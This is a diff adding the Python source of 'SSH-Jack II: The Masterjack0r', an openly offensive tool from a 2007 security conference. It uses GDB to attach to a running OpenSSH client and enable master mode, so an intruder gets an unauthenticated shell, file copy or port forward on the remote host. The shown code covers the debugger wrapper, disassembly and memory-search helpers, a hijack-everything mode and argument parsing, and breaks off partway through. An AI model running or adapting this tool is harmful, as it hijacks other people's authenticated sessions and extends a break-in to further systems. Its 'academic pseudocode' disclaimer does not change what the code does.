@@ -1,0 +1,1634 @@
+#!/usr/bin/python
+#
+#
+# Metlstorm's GDB SSH Hijacker, Version 2: The Masterjack0r
+# 	Requires Python, GDB. Currently filled with all manner of wild 32-bit x86isms.
+#
+# Released at: Kiwicon 2k7, 17-18 Nov, Wellington, New Zealand
+#  www.kiwicon.org
+# 
+# This is the updated version of my Defcon 2k5 release of SSH-Jack, now for
+# OpenSSH >= 4.x, compiled with crazy GCC4 optimisations. 
+# For background story, check out my BH/Defcon/Ruxcon 2k5 talk
+#  "Trust Transience: Post Intrusion SSH Hijacking"
+#
+# Flames to metalstorm@storm.net.nz
+#
+#
+# Try:
+#	./ssh-jack2
+# SSH-Jack 2.0: The Masterjack0r
+#  (c) 2k7 Metlstorm <metlstorm@storm.net.nz>
+#
+#Usage: ./ssh-jack pid
+#       pid: process ID of target SSH client process to jack
+#
+#       ./ssh-jack2 -r
+#       Zomg, enable Rotojack0r mode! 'Jacks everything it can!
+#
+#       ./ssh-jack2 -t path/to/ssh/binary
+#       runs test mode (use to test to see if it's gonna work before you try i
+#    
+#
+# Attaches a debugger to the running SSH process, and convinces it to enable
+# master mode, permitting you to get a shell (or scp, or portforward, or
+# whatever) at the remote end without having the inconvenience of
+# authenticating.
+# Note that you must be able to ptrace the target pid; ie, be root or the
+# same user.
+# Requires OpenSSH 4.x. For OpenSSH 3.x, try the version 1 ssh-jacker.
+#
+# Support status:
+#  Actually tested and known working on:
+#   - Ubuntu Fiesty
+#   - Ubuntu Gutsy
+#   - Debian Etch
+# 
+#  According to the self-test routine, the following *should* work:
+#   SSH-Jack 2.0 Selftest: 
+#    [+] sshes/centos5-ssh
+#    [+] sshes/etch-ssh
+#    [+] sshes/fedora6-ssh
+#    [+] sshes/fedora7-ssh
+#    [+] sshes/fiesty-ssh
+#    [+] sshes/gentoo-ssh
+#    [+] sshes/gutsy-ssh
+#    [+] sshes/mandriva2007.1-ssh
+#    [+] sshes/mandriva2008.0-ssh
+#    [+] sshes/opensuse10.2-ssh
+#    [+] sshes/opensuse10.3-ssh
+#    [+] sshes/rhel5-ssh
+#    [+] sshes/sid-ssh
+#    [+] sshes/slackware10.2-ssh
+#    [+] sshes/slackware11.0-ssh
+#    [+] sshes/slackware12.0-ssh
+#
+#
+# -----------------------------------------------------------------------------------------------
+# LICENSE:
+#  This document is covered by the GNU Free Documentation License. 
+#
+#      Copyright (c)  2005 Metalstorm.
+#      Permission is granted to copy, distribute and/or modify this document
+#      under the terms of the GNU Free Documentation License, Version 1.2
+#      or any later version published by the Free Software Foundation;
+#      with the Invariant Sections being "Disclaimer". A copy of the license
+#      is available at http://gnu.org in the section entitled "GNU Free Documentation License".
+#
+# DISCLAIMER:
+# This document ("Metlstorm's GDB SSH Hijacker") is a concise description of the concepts
+# described in the presentation "Trust Transience: Post Intrusion SSH Hijacking" by the same
+# author, expressed in python. Python is used here as a well understood pseudocode standard
+# and under no circumstances does the author provide this for the purpose of conversion of 
+# this pseudocode into an executable form. This document is for academic study of the concepts
+# discussed in the presentation only. 
+# -----------------------------------------------------------------------------------------------
+#
+#
+# Random notes:
+#
+# - The protocol *requires* that you be able to open multiple sessions to the server
+# - The protocol permits the server to open channels to the client, but reccomends you dont let it.
+# - Wouldn't it be a neat hack to trojan the openssh tree to enable server-to-client shells? Must go and read the code and see if it's not already!
+
+#
+# Changelog:
+#
+# 2.04: Replaced gdbmi/dissassembler core with new one. Waaaay faster.
+# 2.03: Added symbol caching support, so it goes faster the second time. (Written during Damien Miller's SSH Security talk at LCA ;D
+# 2.02: Added support for loaders that rebase the libraries randomly for security, like Fedora Core 8.
+# 2.01: Added offline-disassembly mode, which means it's way less intrusive to the legit user.
+# 2.00: First working release.
+#
+
+VERSION="2.04: The Masterjack0r"
+
+
+import sys
+import os
+import types
+import signal
+import time
+import socket
+import getopt
+import struct
+import binascii
+import pwd
+import errno
+import commands
+import pickle
+
+# Local to the file now
+#import gdbmi
+
+import re
+
+# Disabled now we're not debugging
+#from conzole import prompt
+
+# Supress warning about hex constants with high bit set being negative. Yeah yeah, we fucking know.
+import warnings
+try:
+	warnings.simplefilter('ignore',FutureWarning)
+except AttributeError:
+	pass
+
+# ---- Staticly included gdbmi.py to make it easier to move around ----
+# GDB/mi. With such optimism I read the first bits of the docs. 
+# Then I read the rest, and wept.
+# This is GDB/some-mi, some-hi, some just plain hack. 
+# It vaugely works for what I need.
+# It's only partially my fault it sucks :p
+
+# Metl
+
+GDB="/usr/bin/gdb"
+JACKPATH="/tmp/.masterjack0r-%s/" % pwd.getpwuid(os.getuid())[0]
+SYMCACHE=".symcache"
+
+
+# Turning this on causes us to load GDB on our own ssh first
+# so we can do all the symbol discovery before 
+# connecting to the real ssh. This works so long as the image on disk
+# is the same as the running one. If it's not, then we're screwed.
+# Turning this off will permit us to be more reliable, but with 
+# the downside that we'll appear to hang the ssh client while
+# we're doing disassembly, which is pretty noticeable.
+offlineDisas = True
+cacheSyms = True
+class GDBMIAttachError(Exception):
+	pass
+
+try:
+	False
+except NameError:
+	False = 0
+	True = 1
+
+class gdbmi:
+	debug_level = 0
+
+	LOG="log"
+	CONSOLE="console"
+	TARGET="target"
+	RESULT="result"
+	MESSAGE="message"
+	ASYNC_EXEC="async_exec"
+
+	# Things that GDB says on ptrace attach that look like errors but really arn't. 
+	CONNECT_ERROR_FILTER=["Failed to read a valid object file image from memory.", "warning"]
+
+	# Result codes from the mi
+	R_ERR="error"
+	R_RUN="running"
+	R_CONN="connected"
+	R_EXIT="exit"
+	R_DONE="done"
+
+	def __init__(self):
+		self.i = None
+		self.o = None
+		self.REGNAMES = None
+		self.connected = False
+		self.breaks = []
+
+	def debug(self, data):
+		if self.debug_level >= 1:
+			sys.stderr.write("DEBUG: %s\n" % data)
+
+	def write(self, data):
+		if self.connected:
+			self.o.write(data)
+			self.o.flush()
+			self.debug("Wrote: '%s'" % data)
+		else:
+			raise ValueError("Not connected")
+
+	def command(self, command):
+		self.write("%s\n" % command)
+
+	def kill(self):
+		# Fuckers. it's documented, but isn't implemented :(
+		#self.command("-exec-abort")
+
+		self.command("kill")
+		r = self.readResponse()
+		# TODO check return
+		return True
+
+	def readline(self):
+		if self.connected:
+			i = ""
+			try: 
+				i = self.i.readline()
+			except IOError,e:
+				if e.errno == errno.EINTR:
+					if len(i) == 0 or i[-1] != "\n":
+						i += self.readline()
+				else:
+					raise
+			self.debug("Read: '%s'" % i )
+			return i
+		else:
+			raise ValueError("Not connected")
+
+	def interact(self):
+		print "\nGoing interactive..."
+		print "Commands: EOF  - exit interactive shell"
+		print "        : n    - x/i $eip; stepi; info reg"
+		print "        : py   - switch to python shell"
+		quit = False
+		import readline
+		import code
+		def do_cmd(cmd):
+			self.command(cmd)
+			r = self.readResponse()
+			print r[self.CONSOLE].replace("\n","").replace("\\n","\n").replace("\\t", "\t").replace("\"","")
+
+		while not quit:
+			try:
+				cmd = raw_input("(py-gdb) ")
+				if cmd == "py":
+					print "\nLaunching python shell... use EOF to return to py-gdb shell\n"
+					code.interact(banner="(py) >>> ", local=globals())
+				elif cmd == "n":
+					for c in ["x/i $eip", "stepi", "info reg"]:
+						do_cmd(c)
+				else:
+					do_cmd(cmd)
+			except EOFError:
+				quit = True
+		print
+
+	def readResponse(self):
+		#response = []
+		#response.append(self.readline())
+		#while response[-1] != "(gdb) \n":
+		#	response.append(self.readline())
+
+		r = {self.LOG:"", self.CONSOLE:"", self.TARGET:"", self.RESULT:"", self.MESSAGE:"", self.ASYNC_EXEC:""}
+		line = self.readline()
+		while line != "(gdb) \n" and line != "":
+			if len(line) > 1:
+				if line[0] == "&":
+					r[self.LOG] += line[1:]
+				elif line[0] == "~":
+					r[self.CONSOLE] += line[1:]
+				elif line[0] == "@":
+					r[self.TARGET] += line[1:]
+				elif line[0] == "*":
+					r[self.ASYNC_EXEC] += line[1:]
+				elif line[0] == "^":
+					for rc in [self.R_ERR, self.R_RUN, self.R_CONN, self.R_EXIT, self.R_DONE]:
+						if line[1:len(rc) + 1] == rc:
+							r[self.RESULT] = rc
+							break
+	
+					r[self.MESSAGE] = line[len(rc) + 6:]
+			line = self.readline()
+
+		return r
+
+	def connect(self, pid=None, bin="", remote=False):
+		if not self.connected:
+			if remote != False:
+				self.o, self.i = os.popen2("%s --interpreter=mi" % (GDB))
+			elif pid == None:
+				self.o, self.i = os.popen2("%s --interpreter=mi %s" % (GDB,bin))
+			else:
+				self.o, self.i = os.popen2("%s --interpreter=mi -p %d %s" % (GDB, pid, bin))
+
+			self.connected = True
+			r =self.readResponse()
+			#print r
+
+			if len(r["log"]):
+				for j in self.CONNECT_ERROR_FILTER:
+					if j in r["log"]:
+						return
+
+				raise GDBMIAttachError("Unable to attach to process %s'%s'" % (pid == None and "" or "%s: " % pid, self.formatGDBOutput(r["log"])))
+			if remote != False:
+				self.command("-target-select remote %s" % remote)
+				r = self.readResponse()
+				if r[self.RESULT] != self.R_CONN:
+					raise GDBMIAttachError("Unable to connect to remote target: %s" % r[self.MESSAGE])
+		else:
+			raise ValueError("Already connected.")
+
+	def formatGDBOutput(self, s):
+		"""Mangles the gdb escaping to something sensible"""
+		s = s.replace("\\\\","\\")
+		s = s.replace("\\n", "")
+		s = s.replace("\"","")
+		return s
+
+	def attach(self, pid):
+		self.command("-target-attach %d" % pid)
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			self.connected = False
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def detach(self):
+		"""Alias for disconnect"""
+		return self.disconnect()
+
+	def disconnect(self):
+		self.command("-target-detach")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			self.connected = False
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def getSymbolAddress(self, symbol):
+		""" Fucking unimplemented in gdbmi"""
+		self.command("info address %s" % symbol)
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			rx = re.search("0x[0-9a-fA-F]{1,8}", r[self.CONSOLE], re.MULTILINE)
+			if rx == None:
+				raise ValueError("Failed to find address in '%s'" % r[self.CONSOLE])
+			else:
+				return rx.group()
+
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def insertBreak(self, addr, temp=False, hardware=False):
+		opts = ""
+		if temp:
+			opts += "-t "
+		if hardware:
+			opts += "-h "
+
+		
+		if type(addr) == str:
+			addr = int(addr, 16)
+
+		self.breaks.append((addr, temp, hardware))
+		self.command("-break-insert %s *0x%08x" % (opts, addr))
+
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			#Write code to return breakpoint number
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def clearBreak(self, number):
+		#TODO: this needs to remove them from self.breaks now
+		self.command("-break-delete %d" % number)
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def getSection(self, section):
+		"""Returns the start and end addresses of the section named 'section'"""
+		self.command("info file")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			lines = r[self.CONSOLE].split("\n")
+			for l in lines:
+				rx = re.search("(?P<start>0x[0-9a-fA-F]{1,8}) - (?P<end>0x[0-9a-fA-F]{1,8}) is %s" % section, l)
+				if rx != None:
+					return (eval(rx.groupdict()["start"]), eval(rx.groupdict()["end"]))
+
+			raise ValueError("Unable to locate section '%s'" % section)
+
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def run(self):
+		self.command("-exec-run")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_RUN:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+	
+	def singleStep(self):
+		self.command("-exec-step-instruction")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_RUN:
+			r = self.wait()
+			if r[self.ASYNC_EXEC] != "":
+				# Sweet.
+				pass
+			else:
+				raise ValueError(r[self.MESSAGE])
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+		return r[self.ASYNC_EXEC]
+
+	def cont(self):
+		self.command("-exec-continue")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_RUN:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def returnNow(self):
+		self.command("-exec-return")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])		
+
+	def wait(self):
+		r = self.readResponse()
+		return r
+
+	def waitForBreak(self):
+		while True:
+			r = self.wait()
+			if r[self.ASYNC_EXEC] != "":
+				fr = r[self.ASYNC_EXEC].index("frame={")
+				d = r[self.ASYNC_EXEC][fr+7:]
+				d = d[:d.rindex("}")]
+				d = d.replace("from","fr0m") #heh.
+				dirty = eval("dict(%s)" % d)
+				if dirty.has_key("fr0m"):
+					dirty["from"] = dirty["fr0m"]
+				addr = int(dirty["addr"], 16)
+				if addr in [x[0] for x in self.breaks]:
+					break
+
+				#if r[self.ASYNC_EXEC].find("breakpoint-hit") != -1: 
+				#	break;
+			if r[self.RESULT] == self.R_ERR:
+				# hrm, error. 
+				raise ValueError(r[self.MESSAGE])
+			self.cont()
+		return r[self.ASYNC_EXEC]
+
+	def signal(self, signum):
+		"""Sends signum to debugged process"""
+		self.command("signal %d" % signum)
+		self.readResponse()
+		return True
+
+
+	def getRegNames(self):
+		""" Gets and caches an array mapping x86 general purpose registers to their gdb reg number"""
+		if self.REGNAMES == None:
+			self.command("-data-list-register-names 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15")
+			r = self.readResponse()
+			if r[self.RESULT] == self.R_DONE:
+				# Sweet. It's a perfectly eval-able python list :D
+				self.REGNAMES = eval(r[self.MESSAGE][r[self.MESSAGE].find("=") + 1:])
+			else:
+				raise ValueError(r[self.MESSAGE])
+
+		return self.REGNAMES
+
+
+	def getRegs(self):
+		regnames = self.getRegNames()
+		regvals = {}
+		for rn in range(len(regnames)):
+			self.command("-data-list-register-values x %d" % rn )
+			r = self.readResponse()
+			if r[self.RESULT] == self.R_DONE:
+				begin = r[self.MESSAGE].find("value=\"")
+				end = r[self.MESSAGE][begin + 8 :].find("\"")
+				regvals[regnames[rn]] = int(r[self.MESSAGE][begin+7:begin+8 + end],16)
+			else:
+				raise ValueError(r[self.MESSAGE])
+
+		return regvals
+
+	def getWord(self, addr, words=1):
+		return self.getByte(addr, words * 4)
+
+	def getByte(self, addr, bytes=1):
+		"""Returns a byte from memory at addr"""
+		self.command("-data-read-memory %s x 1 1 %d" % (addr, bytes))
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			begin = r[self.MESSAGE].find("data=[")
+			end = r[self.MESSAGE][begin + 8 :].find("]")
+			buf = ""
+			for c in r[self.MESSAGE][begin+6:begin+8 + end].split(","):
+				buf += chr(int(c[3:5], 16))
+
+			return buf
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def getStr(self, addr, bytes):
+		"""Returns bytes at addr in a string"""
+		return self.getByte(addr, bytes)
+
+	def setByte(self, addr, value):
+		"""Sets a byte in memory at addr. That GDB/MI variable stuff is overkill for this."""
+		self.command("set var {char}0x%08x=0x%08x" % (addr, value))
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def setWord(self, addr, value):
+		"""self.command("set var {word}%s=%s" % (addr, value))
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+		"""
+		for i,v in enumerate([value & 0xff, (value & 0xff00) >> 8, (value & 0xff0000) >> 16, (value & 0xff000000) >> 24]):
+			self.setByte(addr + i, v)
+		return True
+
+	def setEIP(self, value):
+		return self.setReg("eip", value)
+
+	def setReg(self, reg, value):
+		self.command("set var $%s=0x%08x" % (reg, value))
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def interrupt(self):
+		self.command("-exec-interrupt")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def disassemble(self, start=None, end=None, nlines=1):
+		disasm = []
+		if start == None:
+			self.command("-data-disassemble -s $pc -e $pc+%d -- 0" % nlines)
+		else:
+			self.command("-data-disassemble -s 0x%08x -e 0x%08x -- 0" % (start, end))
+			
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			for l in r[self.MESSAGE].split("\n"):
+				if l == "":
+					break
+				# heh, dirty!
+				lstart = l.index("{") + 1
+				lend = l.rindex("}")
+				args = l[lstart:lend].replace(",func-name=",",funcname=")
+				for a in args.split("},{"):
+					z = eval("dict(%s)" % a)	# You trust your debugger, right? :)
+					addr = int(z["address"], 16)
+					nm = z["inst"][:z["inst"].index(" ")]
+					operands = z["inst"][z["inst"].index(" "):].strip()
+					if z.has_key("funcname"):
+						disasm.append((addr, nm, operands, z["funcname"]))
+					else:
+						disasm.append((addr, nm, operands))
+		return disasm
+
+# --- End GDBMI ---
+
+class Disassembler(object):
+	def __init__(self, g, start, end, cacheData={}):
+		self.g = g
+		self.start = start
+		self.end = end
+
+		if cacheData.has_key("disasm-%s-%s" % (start, end)):
+			self.disasm = cacheData["disasm-%s-%s" % (start, end)]
+			self.addrToLine = cacheData["addrToLine-%s-%s" % (start, end)]
+		else:
+			self.disasm = g.disassemble(start, end)
+
+			self.addrToLine = {}
+			for l,a in enumerate(self.disasm):
+				self.addrToLine[a[0]] = l
+			
+			# Cache it
+			cacheData["disasm-%s-%s" % (start, end)] = self.disasm
+			cacheData["addrToLine-%s-%s" % (start, end)] = self.addrToLine
+
+	def toStr(self, x):
+		return "0x%08x: %8s\t%s\n" % (x[0], x[1], x[2])
+
+	def disasDump(self, start, end=None):
+		if end == None:
+			end = start + 1
+		return "".join([self.toStr(x) for x in self.disasm[start:end]])
+
+	def findInstruction(self, nm, op, start=0, reverse=False):
+		REG="%((eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)|(ebp)|(esp))"
+		nm = nm.replace("REG", REG)
+		op = op.replace("REG", REG)
+		rnm = re.compile(nm)
+		rop = re.compile(op)
+		if reverse:
+			end = 0
+			inc = -1
+		else:
+			end = len(self.disasm)
+			inc = 1
+
+
+		for i in xrange(start, end, inc):
+			l = self.disasm[i]
+			if rnm.match(l[1]) != None and rop.match(l[2]) != None:
+				return l[0]
+
+		return None
+
+	def findLoad(self, reg, start, reverse=False):
+		"""Find where register reg is loaded, starting at start, forward or reverse.
+		"""
+		print "  - tracking register %s" % (reg)
+		x = self.findInstruction("(mov.?)|(lea)", ".*,%s" % reg, self.addrToLineNo(start), reverse)
+		if x != None:
+			x = self.disasm[self.addrToLineNo(x)]
+			#print self.toStr(x)
+			ops = x[2].split(",")
+			if ops[0].find("(") == -1:
+				value = int(ops[0], 16)
+				print "  - absolute load with 0x%08x" % value
+				return (x, value)
+			else:
+				offset, sreg = ops[0].split("(")
+				sreg = sreg[:-1]
+				offset = int(offset,16)
+				if offset > 0x7fffffff:
+					offset = offset - 0x100000000
+
+				print "  - register relative load 0x%08x(%s)" % (offset, sreg)
+				return (x, offset, sreg)
+
+		else:
+			return None
+
+	def addrToLineNo(self, addr):
+		return self.addrToLine[addr]
+
+
+class SymbolResolver(object):
+	"""Handles having section-relative symbols, which allows us to handle rebased libraries"""
+	def __init__(self):
+		# Stores a tuple (section_name, offset)
+		self.symbols = {}
+		# Stores a tuple (start, end)
+		self.sections = {}
+
+	def rebase(self, g, bin):
+		oldsect = self.sections.copy()
+		self.updateSections(g, self.sections.keys(), bin)
+		return self.sections != oldsect
+
+	def updateSections(self, g, sections, bin):
+		for s in sections:
+			try:
+				try:
+					self.sections[s] = g.getSection("%s in %s" % (s, bin))
+				except ValueError:
+					self.sections[s] = g.getSection(s)
+			except ValueError:
+				raise ValueError("missing section %s" % s)
+
+	def getSection(self, s):
+		return self.sections[s]
+
+	def getSectionForValue(self, v):
+		for n,s in self.sections.iteritems():
+			if v >= s[0] and v <= s[1]:
+				return n, v - s[0]
+		raise ValueError("No section contains address 0x%08x" % v)
+
+	def addSymbol(self, name, value):
+		self.symbols[name] = self.getSectionForValue(value)
+
+	def getSymbol(self, name):
+		return self.getSection(self.symbols[name][0])[0] + self.symbols[name][1] 
+
+	def __getitem__(self, k):
+		return self.getSymbol(k)
+
+	def __str__(self):
+		rv = "- Sections:"
+		fmt = "\n  %%-%ds: 0x%%08x - 0x%%08x" % reduce(lambda x,y: max(x,y), [ len(x) for x in self.sections.iterkeys() ])
+		for n,s in self.sections.iteritems():
+			rv += fmt % (n, s[0], s[1])
+		if len(self.symbols):
+			fmt = "\n  %%-%ds: %%%ds + 0x%%08x (0x%%08x)" % (reduce(lambda x,y: max(x,y), [ len(x) for x in self.symbols.iterkeys() ]), reduce(lambda x,y: max(x,y), [ len(x) for x in self.sections.iterkeys() ]))
+			rv += "\n- Symbols:"
+			for n,s in self.symbols.iteritems():
+				rv += fmt % (n, s[0], s[1], self.getSymbol(n))
+		return rv
+
+
+def o():
+	"""Used for the inline debug shell, to singlestep"""
+	g.command("x/i $eip")
+	print g.readResponse()["console"]
+	g.command("nexti")
+	print g.readResponse()["console"]
+	g.command("x/32x $esp")
+	print g.readResponse()["console"]
+	print g.getRegs()
+
+def setWord(w, d,o):
+	"Sets d[:2] bytes to be word w"
+	for i in range(2):
+		d[o +i] = (w >> (i * 8)) & 0xff
+
+def setDWord(w, d,o):
+	"Sets d[:4] bytes to be dword w"
+	for i in range( 4):
+		d[o + i] = (w >> (i * 8)) & 0xff
+
+def findInstruction(g, seg, regex):
+	"""Given range seg, walk it dissasembling, and match regex re against output"""
+	for i in range(seg[0], seg[1]):
+		g.command("x/i 0x%08x" % i)
+		r = g.readResponse()
+		rx = regex.search(r["console"])
+		#print r["console"]
+		if rx != None:
+			return i
+
+	return None
+
+def findInstructionOpt(g, seg, regex):
+	"""Given range seg, dissasemble and match regex re against output"""
+	g.command("disassemble 0x%08x 0x%08x" % (seg[0], seg[1]))
+	r = g.readResponse()
+	#fo = open("ass.out", "w")
+	#fo.write(r["console"])
+	#fo.close()
+	rx = regex.search(r["console"])
+	if rx != None:
+		return rx
+
+	return None
+
+def findIntAddr(g, seg, s):
+	for i in range(seg[0], seg[1]):
+		x = g.getWord(i)
+		if s == eval(x):
+			return i
+	return None
+
+def findDataAddr(g, seg, s):
+	"""Given the data s, find it's offset in the segment seg
+	Accepts a string, an integer, or a list of integers at the moment.
+	"""
+
+	look = []
+	if type(s) == types.IntType:
+		return findIntAddr(g, seg, s)
+	if type(s) == types.ListType and type(s[0]) == types.IntType:
+		found = False
+		start = findIntAddr(g, seg, s[0])
+		while not found and start != None:
+			#print "Checking 0x%08x" % start
+			for i in range(len(s[1:])):
+				next = eval(g.getWord(start + (i+1) * 4))
+				#print " 0x%08x == 0x%08x ?" % (s[i+1], next)
+				if s[i+1] != next:
+					found=False
+					break
+				else:
+					found=True
+
+			if not found:
+				start = findIntAddr(g, [start+(len(s) * 4), seg[1]], s[0])
+
+		if found:
+			return start
+		else:
+			return None
+
+	else:
+		return findStringAddrOpt(g,seg,s)
+
+	return None
+
+def findStringAddrOpt(g,seg,s):
+	#TODO: Fix so it doesn't eat mega rams if we're looking for a needle in a very large
+	# haystack
+	segData = g.getStr(seg[0], seg[1] - seg[0])
+	try:
+		offset = segData.index(s)
+		return seg[0] + offset
+	except ValueError:
+		return None
+
+def findPLTEntry(g, sym, got, plt):
+	"""Given the start/end of the got and plt sections, finds the address of the PLT entry for dynamically
+	linked symbol sym using debugger g."""
+
+	# Okay, we could exec readelf.
+	# Or use the mostexcellent elfsh
+	# We could even just parse the rel.plt ourself.
+	# Or... I could just bruteforce it. Which'll work without binutils and elfsh, and is easier.
+	# I'll come back and make this more elegant. One day.
+
+	# First, we find our symbol in the GOT. 
+
+	gotentry = None
+	for i in range(got[0], got[1], 4):
+		x = g.getWord(i)
+		print "Read 4 bytes at 0x%08x: %s" % (i, x)
+		if sym == eval(x):
+		#if sym == eval(g.getWord(i)):
+			gotentry = i
+			#print "Found 0x%08x in GOT at 0x%08x" % (sym, i)
+			break
+
+	if gotentry == None:
+		raise ValueError("Unable to locate 0x%08x in GOT" % sym)
+
+	# Next, we find PLT entries that refer to this GOT entry
+	for i in range(plt[0] + 2, plt[1] - 2, 4):
+		if gotentry == eval(g.getWord(i)):
+			# Actual calls to the PLT talk to our jmp instruction...
+			pltentry = i - 2
+			#print "Found 0x%08x in PLT at 0x%08x" % (sym, pltentry)
+			break
+	if pltentry == None:
+		raise ValueError("Unable to locate 0x%08x in PLT" % gotentry)
+
+	return (pltentry,gotentry)
+
+def getArgv(pid):
+	"""Given pid, opens /proc/pid/cmdline, returns it in an argv style array"""
+	if type(pid) != types.IntType:
+		raise TypeError("Pid must be an integer")
+
+	# let caller catch IOExceptions and stuff.
+	fp = open("/proc/%d/cmdline" % pid, "r")
+	data = fp.read()
+	fp.close()
+	argv = data.split(chr(0))
+	return argv[:-1] 
+
+def sshArgsToCommand(argv):
+	"""Given an argv array, ferret out what ssh thinks the remote command is"""
+
+	# Parse out all normal ssh options. Assume that left over nonoption arguments
+	# are a hostname, and then a remote command. 
+	# AFAICT, the only place that this simplification is wrong is if we have a -o HostName 
+	# option. And uh, maybe the whole if-you-invoke-ssh-via-a-symlink-called-a-hostname thing. 
+	# But that's just silly ;)
+	o, a = getopt.getopt(argv[1:], "1246ab:c:e:fgi:kl:m:no:p:qstvxACD:F:I:KL:MNO:PR:S:TVw:XY")
+	if len(a) > 1:
+		cmd = reduce(lambda x,y: "%s %s" % (x, y), a[1:])
+	else:
+		cmd = None
+
+	return cmd
+
+def sshArgsToHost(argv):
+	host = None
+	o, a = getopt.getopt(argv[1:], "1246ab:c:e:fgi:kl:m:no:p:qstvxACD:F:I:KL:MNO:PR:S:TVw:XY")
+	if len(a) > 0:
+		try:
+			host = a[:a[0].index(":")]
+		except ValueError:
+			host = a[0]
+
+	return host
+
+
+def findSSHBuffer(g, s, seg):
+	"""Given string s, find an SSH Buffer struct in section seg that contains string s. 
+	Assume simple case that s is at the beginning of the buffer for now.
+	Find
+	typedef struct {
+		u_char	*buf;		/* Buffer for data. */
+		u_int	 alloc;		/* Number of bytes allocated for data. */
+		u_int	 offset;	/* Offset of first byte containing data. */
+		u_int	 end;		/* Offset of last byte containing data. */
+	}       Buffer;
+	Default alloc size is 4096, hard coded.
+	"""
+
+	#Hrm. When we're using this in the code, we destroy the value in end, and dont 
+	#restore it, because we've released control of the app when the modified value
+	#is used. The length check seemed like a good idea, but is really only a speed
+	#optimization. 
+
+	DEFAULT_ALLOC=4096
+
+	if len(s) < DEFAULT_ALLOC:
+		alloc = DEFAULT_ALLOC
+	else:
+		alloc = len(s)
+
+	found = False
+	startloc = seg[0]
+
+	while not found and (startloc + 12) <= seg[1]:
+		possible = findDataAddr(g, [startloc, seg[1]], [alloc, 0])  #len(s)] ) See note above.
+		str = ""
+		if possible != None:
+			ptr = eval(g.getWord(possible -4))
+			if ptr > 0:
+				str = g.getStr(ptr, len(s))
+
+			if str == s:
+				found = True
+			else:
+				startloc = possible + 12
+		else:
+			break
+
+	if found:
+		return possible - 4
+	else:
+		return None
+
+def findStringLoad(name, addr, offset):
+	print "  - %s: trying direct load..." % name,
+	loc = d.findInstruction("mov.?", "\$0x%x,.*" % addr)
+
+	if loc == None:
+		print "NOT FOUND"
+		print "  - %s: trying negative-offset from .got.plt load..." % name,
+	else:
+		print "0x%08x" % loc
+		return loc
+
+
+	loc = d.findInstruction("lea", "0x%x\\(REG\\),REG" % offset)
+	if loc == None:
+		print "NOT FOUND"
+	else:
+		print "0x%08x" % loc
+		return loc
+
+	return None
+
+def ohnoes(x,y):
+	print "OH DEAR: timed out doing the dirty deed, the target process is probably borked now :("
+	print "Time to cut and run!"
+	#g.interact()
+	print " Trying to disconnect cleanly... if this hangs, hit ctrl-C"
+	g.disconnect()
+	sys.exit(1)
+
+def usage(): 
+	print 
+	print "Usage: %s pid  " % (sys.argv[0])
+	print "       pid: process ID of target SSH client to 'jack"
+	print 
+	print "       %s -r" % (sys.argv[0])
+	print "       Zomg, enable Rotojack0r mode! 'Jacks everything it can!"
+	print 
+	print "       %s -t path/to/ssh/binary" % (sys.argv[0])
+	print "       runs test mode (use to test to see if it's gonna work before you try it)"
+	print 
+	print " Attaches a debugger to the running SSH process, and convinces it to enable\n master mode, permitting you to get a shell (or scp, or portforward, or\n whatever) at the remote end without having the inconvenience of\n authenticating."
+	print " Note that you must be able to ptrace the target pid; ie, be root or the\n same user."
+	print " Requires OpenSSH 4.x. For OpenSSH 3.x, try the version 1 ssh-jacker." 
+	sys.exit(1)
+
+print "--==[ SSH-Jack II: The Masterjack0r ]==--"
+print "  Runtime SSH hijacking; oldschool trust expansion pwnage!"
+print "  Version: %s" % VERSION
+print 
+print "  Released 17 November 2007 at Kiwicon 2k7, Wellington, New Zealand"
+print "  www.kiwicon.org \m/"
+print "  (c) 2k7 Metlstorm <metlstorm@storm.net.nz>"
+print 
+print "------------------------------------------"
+
+rotojack0r = False
+testmode = False
+if len(sys.argv) ==  3:
+	if sys.argv[1] == "-t":
+		# Test mode. Just run the pattern matcher stuff.
+		# Of no interest to anyone but me. 
+		bin = sys.argv[2]
+		testmode = True
+	else:
+		usage()
+elif len(sys.argv) == 2:
+	if sys.argv[1] == "-r":
+		rotojack0r = True
+	else:
+		try:
+			pid = int(sys.argv[1])
+		except ValueError:
+			usage()
+else:
+	usage()
+
+
+if not os.path.exists(GDB):
+	gdbpath = commands.getoutput("which gdb")
+	if gdbpath == "":
+		print "Sorry, unable to figure out path to gdb. Please make sure it's in your PATH"
+		sys.exit(1)
+	GDB = gdbpath
+
